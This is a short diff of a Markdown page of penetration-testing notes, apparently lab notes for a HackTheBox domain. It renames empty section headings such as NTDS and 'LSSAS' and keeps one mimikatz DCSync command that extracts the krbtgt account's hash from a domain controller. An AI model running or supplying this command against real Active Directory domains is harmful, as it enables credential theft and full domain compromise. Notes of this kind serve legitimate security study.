@@ -10,14 +10,13 @@ cover: https://sighingnow.github.io/jekyll-gitbook/assets/dinosaur.gif
 
 
 
-# Credentials Dumping
 ## Local SAM
 ```powershell
 mimikatz# lsadump::dcsync /domain:htb.local /user:krbtgt
 ```
-## VLANs
+## NTDS
 
-## SDP
+## LSSAS
 
 > ##### TIP
 >
